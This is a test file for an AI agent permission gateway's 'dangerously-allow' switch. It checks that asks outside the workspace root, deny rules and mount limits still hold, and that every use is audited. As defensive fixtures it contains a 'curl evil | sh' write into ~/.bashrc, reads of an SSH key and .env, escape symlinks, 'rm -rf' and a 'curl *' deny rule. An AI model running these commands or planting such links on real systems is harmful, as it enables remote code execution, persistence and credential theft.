import { randomUUID } from 'node:crypto'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { emptyWorkspacePolicy, type ActionReport, type InvokeResponse, type JsonValue, type PermissionRuleId, type WorkspacePolicy } from '@5straps/protocol'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { policyCommand } from '../cli/policy.js'
import { AuditUnavailableError } from '../common/adapters/action-log/file-action-log.js'
import type { ToolEffect } from '../common/domain/effect.js'
import { dangerousUses, redactedSubject } from '../common/domain/permission/rules/dangerously-allow.js'
import { dangerouslyAllowPath, loadConfig, type BuckleConfig } from '../common/runtime/config.js'
import { configFromEnvironment } from './support/workspace-config.js'
import { createRuntime, type BuckleRuntime } from '../common/services/workspaces/workspace-runtime.js'
import { settingsPath } from '../common/services/workspaces/workspace-settings.js'
import { runCli } from './support/cli.js'
import { byName, idOf, workspaceIdOf, workspacesOf } from './support/workspaces.js'
import type { Reporter } from '../common/types/ports/reporter.js'

// B20, rulings 11 and H1 of 2026-09-28, owner decision D7 of 2026-09-29: one local switch per
// workspace turns every ask inside the workspace root (or its mount) into an allow, sensitive files and
// file writes included; asks about paths outside it keep asking, denies still refuse, and every use is
// audited. No node switch stands beside a workspace's (Q14 of the workspace-model brief). Review H1 of
// B20-B22: the switch lives apart from the policy, so switching never replaces a workspace's policy.

const roots: string[] = []
const servers: Server[] = []
afterEach(async () => {
  vi.restoreAllMocks()
  for (const server of servers.splice(0)) await new Promise(resolve => server.close(resolve))
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true })
})

interface Node { root: string; workspace: string; outside: string; config: BuckleConfig; runtime: BuckleRuntime; reports: ActionReport[] }

async function node(input: { policy?: string } = {}): Promise<Node> {
  const root = mkdtempSync(join(tmpdir(), 'buckle-dangerously-'))
  roots.push(root)
  const workspace = join(root, 'workspace')
  const outside = join(root, 'home')
  mkdirSync(join(workspace, 'private'), { recursive: true })
  mkdirSync(join(outside, '.ssh'), { recursive: true })
  mkdirSync(join(root, 'state'), { mode: 0o700 })
  writeFileSync(join(workspace, '.env'), 'FIXTURE=synthetic\n')
  writeFileSync(join(workspace, 'private', 'notes.md'), 'private notes\n')
  writeFileSync(join(outside, '.ssh', 'id_ed25519'), 'synthetic key fixture\n')
  writeFileSync(join(outside, '.bashrc'), '# fixture\n')
  // Dangling links an agent could plant (review H1 and H2 of B23-B25): out of the root, and into Buckle's state.
  symlinkSync('../home/planted.txt', join(workspace, 'escape-link.txt'))
  symlinkSync('../state/dangerously-allow.json', join(workspace, 'state-link.json'))
  const config = configFromEnvironment({
    BUCKLE_WORKSPACE_ROOT: workspace, BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_ALLOW_SHELL: 'true', BUCKLE_SHELL_ISOLATION: 'false',
    BUCKLE_PACKS: 'fs,shell,web', BUCKLE_APPROVAL_TIMEOUT_MS: '1', ...(input.policy ? { BUCKLE_POLICY: input.policy } : {}),
  })
  const reports: ActionReport[] = []
  const reporter: Reporter = { configured: true, record: entry => { reports.push(entry) }, report: async () => {}, flush: async () => {} }
  const runtime = await createRuntime({ config, reporter })
  return { root, workspace, outside, config, runtime, reports }
}

/** The real permission pipeline; a prepared effect stands in for the tool's own, and nothing host-side runs. */
async function call(runtime: BuckleRuntime, tool: string, effects: ToolEffect[]) {
  const execute = vi.fn(async () => 'executed')
  const prepare = vi.spyOn(runtime.registry().get(tool), 'prepare').mockReturnValue({ effects, execute })
  const requestId = `dangerously-${randomUUID()}`
  const result = await runtime.invoke({ request: { requestId, approvalTokens: [], tool, args: {} }, sessionId: 'dangerously-session', approvalWait: { mode: 'none' } })
  prepare.mockRestore()
  return { result, execute, requestId }
}

/** A real tool, as an agent calls it. */
async function run(runtime: BuckleRuntime, tool: string, args: Record<string, JsonValue>): Promise<{ result: InvokeResponse; requestId: string }> {
  const requestId = `dangerously-real-${randomUUID()}`
  const result = await runtime.invoke({ request: { requestId, approvalTokens: [], tool, args }, sessionId: 'dangerously-session', approvalWait: { mode: 'none' } })
  return { result, requestId }
}

function policy(change: (value: WorkspacePolicy) => void): WorkspacePolicy {
  const value = emptyWorkspacePolicy()
  change(value)
  return value
}

function uses(runtime: BuckleRuntime, requestId: string) {
  return runtime.actions.read(200).filter(entry => entry.tool === 'policy_dangerously_allowed' && entry.requestId === requestId)
}

function runtimeUses(runtime: BuckleRuntime) {
  return runtime.actions.read(200).filter(entry => entry.tool === 'policy_dangerously_allowed')
}

function asked(result: InvokeResponse): string[] {
  return result.outcome === 'approval_required' ? result.approvals.map(approval => approval.rule) : []
}

/** Every ask kind the permission engine raises, from the tool that raises it (plan section C; H1), inside the workspace or naming no path. */
function covered(node: Node): Array<{ kind: string; tool: string; effects: ToolEffect[]; rule: PermissionRuleId }> {
  const { workspace } = node
  return [
    { kind: 'a destructive command', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'rm', args: ['-rf', 'build'] }], rule: 'destructive_command' },
    { kind: 'the working-directory write of a shell command', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'ls', args: [] }, { kind: 'write_path', path: workspace }], rule: 'write_scope' },
    { kind: 'the working-directory write of a script', tool: 'script_run', effects: [{ kind: 'exec', command: 'node', args: ['script.mjs'] }, { kind: 'write_path', path: workspace }], rule: 'write_scope' },
    { kind: 'a read the filesystem policy asks about', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(workspace, 'private', 'notes.md') }], rule: 'filesystem_policy' },
    { kind: 'a sensitive file', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(workspace, '.env') }], rule: 'sensitive_path' },
    { kind: 'fs_write', tool: 'fs_write', effects: [{ kind: 'write_path', path: join(workspace, 'note.md') }], rule: 'write_scope' },
    { kind: 'fs_patch', tool: 'fs_patch', effects: [{ kind: 'write_path', path: join(workspace, 'note.md') }], rule: 'write_scope' },
    { kind: 'a batch write', tool: 'fs_write_batch', effects: [{ kind: 'write_path', path: join(workspace, 'a.md') }, { kind: 'write_path', path: join(workspace, 'b', 'c.md') }], rule: 'write_scope' },
    { kind: 'a private network address', tool: 'web_fetch', effects: [{ kind: 'network', url: 'http://127.0.0.1:9/probe' }], rule: 'network_egress' },
    // lsp_discover's effect; the dev pack needs a host language-server setup this test does not have.
    { kind: 'a process listing', tool: 'fs_list', effects: [{ kind: 'process_probe' }], rule: 'process_probe' },
  ]
}

/** Asks about paths outside the workspace root: the switch leaves them asking (owner decision D7). */
function uncovered(node: Node): Array<{ kind: string; tool: string; effects: ToolEffect[]; rule: PermissionRuleId }> {
  const { workspace, outside } = node
  return [
    { kind: 'a read outside the workspace', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(outside, 'notes.md') }], rule: 'read_scope' },
    { kind: 'a batch write half outside', tool: 'fs_write_batch', effects: [{ kind: 'write_path', path: join(workspace, 'a.md') }, { kind: 'write_path', path: join(outside, 'b.md') }], rule: 'write_scope' },
    { kind: 'a shell whose working directory is outside', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'ls', args: [] }, { kind: 'write_path', path: outside }], rule: 'write_scope' },
    { kind: 'a write through a dangling link out of the root', tool: 'fs_write', effects: [{ kind: 'write_path', path: join(workspace, 'escape-link.txt') }], rule: 'write_scope' },
  ]
}

const privateAsks = policy(value => { value.filesystem = { rules: [{ path: 'private', read: 'ask' }] } })

describe('the dangerously-allow switch over every ask kind (coverage table)', () => {
  it('asks for each kind while off, allows each inside the workspace while on, audited per use, and keeps asking outside it', async () => {
    const setup = await node()
    const { runtime } = setup
    await runtime.policy.apply(privateAsks)
    for (const row of [...covered(setup), ...uncovered(setup)]) {
      const off = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: off.result.outcome }).toEqual({ kind: row.kind, outcome: 'approval_required' })
      expect(asked(off.result)).toContain(row.rule)
      expect(off.execute).not.toHaveBeenCalled()
    }

    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    await policyCommand(runtime, ['dangerously-allow', 'on'])
    for (const row of covered(setup)) {
      const on = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: on.result.outcome }).toEqual({ kind: row.kind, outcome: 'ok' })
      expect(on.execute).toHaveBeenCalledOnce()
      expect(uses(runtime, on.requestId).map(entry => entry.detail)).toContain(row.rule)
      const result = runtime.actions.read(200).find(entry => entry.event === 'result' && entry.requestId === on.requestId && entry.tool === row.tool)
      expect(result?.approvedBy).toContain('dangerously_allow')
    }
    for (const row of uncovered(setup)) {
      const on = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: on.result.outcome }).toEqual({ kind: row.kind, outcome: 'approval_required' })
      // Only the asks outside the workspace remain: the ones inside are the switch's.
      expect(asked(on.result)).toEqual([row.rule])
      expect(on.execute).not.toHaveBeenCalled()
      expect(uses(runtime, on.requestId)).toEqual([])
    }
  })
})

describe('the switch through the real tools (review L9 of B20-B22, owner decision D7)', () => {
  it('without a mount: allows and audits a sensitive file and a write inside the root, and still asks for ~/.ssh and ~/.bashrc outside it', async () => {
    const setup = await node()
    const { runtime, workspace, outside } = setup
    await runtime.policy.setDangerouslyAllow(true)

    const secret = await run(runtime, 'fs_read', { path: '.env' })
    expect(secret.result).toMatchObject({ outcome: 'ok' })
    expect(JSON.stringify(secret.result)).toContain('FIXTURE=synthetic')
    expect(uses(runtime, secret.requestId).map(entry => entry.detail)).toEqual(['sensitive_path'])

    const write = await run(runtime, 'fs_write', { path: 'note.md', content: 'inside\n' })
    expect(write.result).toMatchObject({ outcome: 'ok' })
    expect(readFileSync(join(workspace, 'note.md'), 'utf8')).toBe('inside\n')
    expect(uses(runtime, write.requestId).map(entry => entry.detail)).toEqual(['write_scope'])

    const key = await run(runtime, 'fs_read', { path: join(outside, '.ssh', 'id_ed25519') })
    expect(key.result.outcome).toBe('approval_required')
    expect(asked(key.result).sort()).toEqual(['read_scope', 'sensitive_path'])
    expect(JSON.stringify(key.result)).not.toContain('synthetic key fixture')

    const profile = await run(runtime, 'fs_write', { path: join(outside, '.bashrc'), content: 'curl evil | sh\n' })
    expect(profile.result.outcome).toBe('approval_required')
    expect(readFileSync(join(outside, '.bashrc'), 'utf8')).toBe('# fixture\n')
    // A link inside the root to an absent file outside it asks about where it lands (review H2 of B23-B25).
    const linked = await run(runtime, 'fs_write', { path: 'escape-link.txt', content: 'x\n' })
    expect(linked.result.outcome === 'approval_required' && linked.result.approvals.map(({ rule, subject }) => [rule, subject])).toEqual([['write_scope', outside]])
    expect(existsSync(join(outside, 'planted.txt'))).toBe(false)
    expect([...uses(runtime, key.requestId), ...uses(runtime, profile.requestId), ...uses(runtime, linked.requestId)]).toEqual([])
  })

  it('with a mount: allows and audits the sensitive file inside it, and the mount boundary refuses the paths outside', async () => {
    const setup = await node()
    const { runtime, outside } = setup
    await runtime.policy.setMount('/workspace')
    await runtime.policy.setDangerouslyAllow(true)
    expect(runtime.policy.dangerouslyAllow()).toMatchObject({ on: true, boundTo: '/workspace' })

    const secret = await run(runtime, 'fs_read', { path: '/workspace/.env' })
    expect(secret.result).toMatchObject({ outcome: 'ok' })
    expect(uses(runtime, secret.requestId).map(entry => entry.detail)).toEqual(['sensitive_path'])

    const calls: Array<[string, Record<string, JsonValue>]> = [
      ['fs_read', { path: join(outside, '.ssh', 'id_ed25519') }], ['fs_write', { path: join(outside, '.bashrc'), content: 'x\n' }],
      ['fs_write', { path: '/workspace/escape-link.txt', content: 'x\n' }], ['fs_write_batch', { files: [{ path: '/workspace/escape-link.txt', content: 'x\n' }] }],
    ]
    for (const [tool, args] of calls) {
      const refused = await run(runtime, tool, args)
      expect(refused.result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
      expect(uses(runtime, refused.requestId)).toEqual([])
    }
  })

  it('runs a real shell command, destructive and in the workspace, and audits both uses once each', async () => {
    const setup = await node()
    const { runtime } = setup
    await runtime.policy.setDangerouslyAllow(true)
    const shell = await run(runtime, 'shell_exec', { command: 'rm', args: ['-rf', 'build'] })
    expect(shell.result).toMatchObject({ outcome: 'ok' })
    expect(uses(runtime, shell.requestId).map(entry => entry.detail).sort()).toEqual(['destructive_command', 'write_scope'])
  })

  it('reaches a loopback server with web_fetch, audits the hop before it is made, and refuses the hop when the audit cannot be written (review M3 of B20-B22)', async () => {
    const setup = await node()
    const { runtime, root } = setup
    let hits = 0
    const server = createServer((_, response) => { hits++; response.end('loopback fixture') })
    servers.push(server)
    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
    const url = `http://127.0.0.1:${(server.address() as { port: number }).port}/probe`

    const off = await run(runtime, 'web_fetch', { url })
    expect(off.result.outcome).toBe('approval_required')
    await runtime.policy.setDangerouslyAllow(true)
    const on = await run(runtime, 'web_fetch', { url })
    expect(on.result).toMatchObject({ outcome: 'ok', output: { status: 200, body: 'loopback fixture' } })
    expect(hits).toBe(1)
    expect(uses(runtime, on.requestId).map(entry => entry.detail)).toEqual(['network_egress'])

    // The use entry is required: a log that will not take it refuses the hop, and nothing is fetched.
    const record = runtime.actions.record.bind(runtime.actions)
    vi.spyOn(runtime.actions, 'record').mockImplementation(async (entry) => {
      if (entry.tool === 'policy_dangerously_allowed') throw new AuditUnavailableError()
      return record(entry)
    })
    await expect(run(runtime, 'web_fetch', { url })).rejects.toBeInstanceOf(AuditUnavailableError)
    expect(hits).toBe(1)
    expect(existsSync(join(root, 'state'))).toBe(true)
  })
})

describe('what the switch never turns (policy.md: a matched deny stays denied)', () => {
  it.each([
    ['an owner command deny rule', 'shell_exec', (setup: Node): ToolEffect[] => [{ kind: 'exec', command: 'rm', args: ['-rf', 'build'] }], policy(value => { value.commands.deny = ['rm *'] })],
    ['a filesystem deny rule', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.workspace, 'private', 'notes.md') }], policy(value => { value.filesystem = { rules: [{ path: 'private', read: 'deny' }] } })],
    ['the tool policy', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }], policy(value => { value.tools = { deny: ['fs_write'] } })],
    ['the mount boundary', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.outside, 'notes.md') }], policy(value => { value.mount = '/workspace' })],
    ['Buckle\'s own state', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.root, 'state', 'policy.json') }], emptyWorkspacePolicy()],
    ['the mount boundary through a dangling link', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'escape-link.txt') }], policy(value => { value.mount = '/workspace' })],
    ['Buckle\'s own state through a dangling link', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'state-link.json') }], emptyWorkspacePolicy()],
    ['Buckle\'s own state through a dangling link under a mount', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'state-link.json') }], policy(value => { value.mount = '/workspace' })],
  ])('keeps %s refusing', async (_, tool, effects, stored) => {
    const setup = await node()
    await setup.runtime.policy.apply(stored)
    // Where the folder shows is the mount table's, set by the owner's CLI alone.
    if (stored.mount) await setup.runtime.policy.setMount(stored.mount)
    await setup.runtime.policy.setDangerouslyAllow(true)
    const { result, execute } = await call(setup.runtime, tool, effects(setup))
    expect(result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
    expect(execute).not.toHaveBeenCalled()
    expect(runtimeUses(setup.runtime)).toEqual([])
  })
})

describe('a workspace\'s switch, with no node switch beside it', () => {
  it('takes effect on its own', async () => {
    const setup = await node()
    await setup.runtime.policy.setDangerouslyAllow(true)
    expect(setup.runtime.policy.dangerouslyAllow()).toEqual({ on: true, boundTo: setup.workspace })
    const { result } = await call(setup.runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])
    expect(result.outcome).toBe('ok')
  })
})

describe('a registered workspace keeps its policy through the switch (review H1 of B20-B22)', () => {
  const REGISTERED = policy((value) => {
    value.commands.deny = ['rm *', 'curl *']
    value.tools = { deny: ['fs_write'] }
    value.filesystem = { rules: [{ path: 'private', read: 'deny' }] }
    value.network.allow = ['example.com']
  })

  /** The node and its manager over one state directory, as a start of the node opens them. */
  async function start(root: string) {
    const config = configFromEnvironment({ BUCKLE_WORKSPACE_ROOT: join(root, 'default'), BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_ALLOW_SHELL: 'true', BUCKLE_SHELL_ISOLATION: 'false', BUCKLE_PACKS: 'fs,shell,web', BUCKLE_APPROVAL_TIMEOUT_MS: '1' })
    const manager = await workspacesOf(config)
    const runtime = (await byName(manager, 'default')).runtime
    return { config, runtime, manager }
  }

  async function stop(started: Awaited<ReturnType<typeof start>>): Promise<void> {
    for (const runtime of await started.manager.opened()) {
      await runtime.workbenches.close()
      await runtime.history.close()
    }
  }

  async function childRefuses(started: Awaited<ReturnType<typeof start>>): Promise<void> {
    const { runtime: child } = await byName(started.manager, 'child')
    expect(child.policy.effective()).toMatchObject({ commands: { deny: ['rm *', 'curl *'] }, tools: { deny: ['fs_write'] }, network: { allow: ['example.com'] }, filesystem: { rules: [{ path: 'private', read: 'deny' }] }, mount: '/workspace' })
    expect(Object.keys(child.policy.effective())).not.toContain('dangerouslyAllow')
    // A registered workspace runs no shell without bubblewrap, so its command denies are checked in the effective policy above.
    expect((await run(child, 'fs_read', { path: '/workspace/private/notes.md' })).result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
    expect((await run(child, 'fs_write', { path: '/workspace/note.md', content: 'x' })).result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
  }

  it('on, restart, off, restart: the denies still refuse and the network list stays', async () => {
    const root = mkdtempSync(join(tmpdir(), 'buckle-dangerously-child-'))
    roots.push(root)
    for (const directory of ['default', join('child', 'private')]) mkdirSync(join(root, directory), { recursive: true })
    writeFileSync(join(root, 'child', 'private', 'notes.md'), 'private\n')
    let started = await start(root)
    await started.manager.create({ id: 'child', name: 'Child', dir: join(root, 'child'), policy: REGISTERED })
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const settings = settingsPath(started.config.nodeStateDirectory!, idOf(started.manager, 'child'))
    const before = readFileSync(settings, 'utf8')

    await policyCommand((await byName(started.manager, 'child')).runtime, ['dangerously-allow', 'on'])
    const childState = (await byName(started.manager, 'child')).config
    // The switch writes its own file, keyed by the workspace's id, and never the settings the child's policy is read from.
    expect(readFileSync(settings, 'utf8')).toBe(before)
    expect(JSON.parse(readFileSync(dangerouslyAllowPath(childState), 'utf8'))).toMatchObject({ version: 1, workspaces: { [idOf(started.manager, 'child')]: { on: true } } })
    await stop(started)

    started = await start(root)
    expect((await byName(started.manager, 'child')).runtime.policy.dangerouslyAllow()).toMatchObject({ on: true })
    await childRefuses(started)

    await policyCommand((await byName(started.manager, 'child')).runtime, ['dangerously-allow', 'off'])
    await stop(started)
    started = await start(root)
    expect((await byName(started.manager, 'child')).runtime.policy.dangerouslyAllow().on).toBe(false)
    await childRefuses(started)
    await stop(started)
  })
})

// Finding 42 of the Phase 1 review: the switch named by --workspace or --dir through the CLI dispatch, from another
// workspace's folder, lands under the named workspace; only its own tests ran the switch on a resolved runtime.
describe('buckle policy dangerously-allow --workspace and --dir', () => {
  it('land the switch and its audit record under the named workspace, never under the folder the command runs in', async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'buckle-dangerously-target-')))
    roots.push(root)
    for (const folder of ['default', 'child']) mkdirSync(join(root, folder))
    const environment = { BUCKLE_WORKSPACE_ROOT: join(root, 'default'), BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_APPROVAL_TIMEOUT_MS: '1' }
    const manager = await workspacesOf(configFromEnvironment(environment))
    await manager.create({ id: 'child', name: 'Child', dir: join(root, 'child') })
    await manager.close()
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const config = loadConfig(environment)
    // Every workspace keeps its records under its own id (D85, Q15); the id a folder derives is the registry's.
    const idsOf = { default: workspaceIdOf(join(root, 'default')), child: workspaceIdOf(join(root, 'child')) }
    const stateOf = (name: 'default' | 'child') => join(root, 'state', 'workspaces', idsOf[name])
    const readJson = (file: string) => (existsSync(file) ? JSON.parse(readFileSync(file, 'utf8')) as { workspaces: Record<string, { on: boolean }> } : { workspaces: {} })
    const switchOf = (name: 'default' | 'child') => readJson(dangerouslyAllowPath({ stateDirectory: stateOf(name) })).workspaces
    const changes = (name: 'default' | 'child') => {
      const file = join(stateOf(name), 'actions.jsonl')
      if (!existsSync(file)) return []
      // The switch's own record, as written once it changed; the attempt record before it is not counted.
      return readFileSync(file, 'utf8').split('\n').filter(Boolean).map(line => JSON.parse(line) as { tool: string; event: string; workspaceId: string; detail?: string }).filter(entry => entry.tool === 'policy_dangerously_allow_changed' && entry.event === 'result')
    }
    const inDefault = (argv: string[]) => runCli({ argv: ['policy', 'dangerously-allow', ...argv], config, confirm: null, cwd: join(root, 'default') })

    expect((await inDefault(['on', '--workspace', 'child'])).exitCode).toBe(0)
    expect(switchOf('child')).toMatchObject({ [idsOf.child]: { on: true } })
    expect(switchOf('default')).toEqual({})
    expect(changes('child')).toMatchObject([{ workspaceId: idsOf.child, workspaceName: 'Child', detail: 'on' }])
    expect(changes('default')).toEqual([])

    expect((await inDefault(['off', '--dir', join(root, 'child')])).exitCode).toBe(0)
    // Off removes the workspace's entry from its own switch file.
    expect(switchOf('child')).toEqual({})
    expect(switchOf('default')).toEqual({})
    expect(changes('child')).toMatchObject([{ workspaceId: idsOf.child, detail: 'on' }, { workspaceId: idsOf.child, detail: 'off' }])
    expect(changes('default')).toEqual([])
  })
})

describe('the audit of every use and every change', () => {
  it('records each use with its rule and redacted subject, reports it to Rings, and warns in the owner\'s log', async () => {
    const setup = await node()
    const { runtime, reports } = setup
    await runtime.policy.setDangerouslyAllow(true)
    const { requestId } = await call(runtime, 'shell_exec', [{ kind: 'exec', command: 'rm', args: ['-rf', 'build', '--token=zq81-synthetic-secret'] }, { kind: 'write_path', path: setup.workspace }])

    const entries = uses(runtime, requestId)
    expect(entries.map(entry => entry.detail).sort()).toEqual(['destructive_command', 'write_scope'])
    const destructive = entries.find(entry => entry.detail === 'destructive_command')
    expect(destructive?.args).toEqual({ tool: 'shell_exec', rule: 'destructive_command', subject: expect.stringMatching(/^rm \[\d+ characters\]$/) })
    expect(JSON.stringify(runtime.actions.read(200))).not.toContain('zq81')
    const reported = reports.filter(report => report.tool === 'policy_dangerously_allowed')
    expect(reported.map(report => report.rule).sort()).toEqual(['destructive_command', 'write_scope'])
    expect(JSON.stringify(reports)).not.toContain('zq81')
  })

  it('writes one entry per rule and subject a call meets, however often it meets them (review L12 of B20-B22)', async () => {
    const setup = await node()
    const { runtime, workspace } = setup
    await runtime.policy.apply(policy(value => { value.filesystem = { rules: [{ path: 'private', read: 'ask' }] } }))
    for (const index of [1, 2, 3]) writeFileSync(join(workspace, 'private', `more-${index}.md`), 'x\n')
    await runtime.policy.setDangerouslyAllow(true)
    const walked = await run(runtime, 'fs_read_batch', { paths: ['private/notes.md', 'private/notes.md', 'private/more-1.md'] })
    expect(walked.result.outcome).toBe('ok')
    const subjects = uses(runtime, walked.requestId).map(entry => (entry.args as { subject: string }).subject)
    expect(subjects).toEqual([...new Set(subjects)])
    expect(subjects.length).toBe(2)
  })

  it('records the switch itself, on and off, and applies off at once without a restart', async () => {
    const setup = await node()
    const { runtime } = setup
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    await policyCommand(runtime, ['dangerously-allow', 'on'])
    expect((await call(runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])).result.outcome).toBe('ok')
    await policyCommand(runtime, ['dangerously-allow', 'off'])
    expect((await call(runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])).result.outcome).toBe('approval_required')
    const changes = runtime.actions.read(200).filter(entry => entry.tool === 'policy_dangerously_allow_changed' && entry.event === 'result')
    expect(changes.map(entry => entry.detail)).toEqual(['on', 'off'])
  })

  it('shows the switch and its boundary in buckle policy show, and says what it covers when switched on (owner decision D7)', async () => {
    const setup = await node()
    let printed = ''
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => { printed += String(chunk); return true })
    await policyCommand(setup.runtime, ['dangerously-allow', 'on'])
    expect(printed).toContain('WARNING: dangerously allow is on')
    expect(printed).toContain(`bound to the workspace root, or its mount when one is set (${setup.workspace})`)
    const covers = "Every ask about a path inside it, and every command, host, and process ask, is allowed without a person, sensitive files and file writes included, except that a secret reference's file still asks a person. Paths outside it keep their normal outcome: they ask, or the mount refuses them."
    expect(printed).toContain(covers)
    expect(printed).not.toContain('mount boundary still refuse')
    printed = ''
    await policyCommand(setup.runtime, ['show'])
    // The same sentence in show (review L15 of B23-B25).
    expect(printed).toContain('Dangerously allow  ON, bound to the workspace root, or its mount when one is set')
    expect(printed).toContain(covers)
    expect(printed).not.toContain('every ask there')
    printed = ''
    await policyCommand(setup.runtime, ['show', '--json'])
    const shown = JSON.parse(printed) as { dangerouslyAllow: unknown; effective: Record<string, unknown> }
    expect(shown.dangerouslyAllow).toEqual({ on: true, boundTo: setup.workspace })
    expect(Object.keys(shown.effective)).not.toContain('dangerouslyAllow')
  })
})

describe('only the switch changes the switch (ruling H1e)', () => {
  it('keeps the switch through other policy writes and a clear, which never touch it', async () => {
    const setup = await node()
    const { runtime } = setup
    await runtime.policy.setDangerouslyAllow(true)
    await runtime.policy.apply(policy(value => { value.network.allow = ['example.com'] }))
    expect(runtime.policy.dangerouslyAllow().on).toBe(true)
    expect(Object.keys(runtime.policy.stored())).not.toContain('dangerouslyAllow')
    await runtime.policy.clear()
    expect(runtime.policy.stored().network.allow).toEqual([])
    expect(runtime.policy.dangerouslyAllow().on).toBe(true)
  })

  it('refuses a policy file that names the switch from buckle policy import, exit 2 as the setup face answers 409', async () => {
    const setup = await node()
    let written = ''
    vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => { written += String(chunk); return true })
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const file = join(setup.root, 'policy.json')
    for (const flags of [{ commands: true, fileReads: true }, { commands: false, fileReads: false }]) {
      writeFileSync(file, JSON.stringify({ ...emptyWorkspacePolicy(), network: { allow: ['example.com'] }, dangerouslyAllow: flags }))
      expect((await policyCommand(setup.runtime, ['import', file])).exitCode).toBe(2)
    }
    expect(written).toContain('The dangerously-allow switch is not part of a workspace policy')
    expect(setup.runtime.policy.stored().network.allow).toEqual([])
    expect(setup.runtime.policy.dangerouslyAllow().on).toBe(false)
    writeFileSync(file, JSON.stringify({ ...emptyWorkspacePolicy(), network: { allow: ['example.com'] } }))
    expect((await policyCommand(setup.runtime, ['import', file])).exitCode).toBe(0)
  })

  it('refuses usage other than on or off', async () => {
    const setup = await node()
    vi.spyOn(process.stderr, 'write').mockImplementation(() => true)
    expect((await policyCommand(setup.runtime, ['dangerously-allow'])).exitCode).toBe(1)
    expect((await policyCommand(setup.runtime, ['dangerously-allow', 'yes'])).exitCode).toBe(1)
    expect(setup.runtime.policy.dangerouslyAllow().on).toBe(false)
  })

  it('reads an unreadable switch file as off', async () => {
    const setup = await node()
    await setup.runtime.policy.setDangerouslyAllow(true)
    writeFileSync(dangerouslyAllowPath(setup.config), '{ not json')
    expect(setup.runtime.policy.dangerouslyAllow().on).toBe(false)
    chmodSync(dangerouslyAllowPath(setup.config), 0o600)
  })
})

describe('the switch as data', () => {
  it('reads its uses back from allowedBy, and redacts command lines to the executable', () => {
    expect(dangerousUses(['write_scope:/a', 'dangerously_allow:network_egress:127.0.0.1:9'])).toEqual([{ rule: 'network_egress', subject: '127.0.0.1:9' }])
    expect(redactedSubject('destructive_command', 'curl -H Authorization: secret')).toBe('curl [29 characters]')
    expect(redactedSubject('read_scope', '/tmp/outside')).toBe('/tmp/outside')
    expect(redactedSubject('read_scope', 'x'.repeat(300))).toBe('[300 characters]')
  })
})
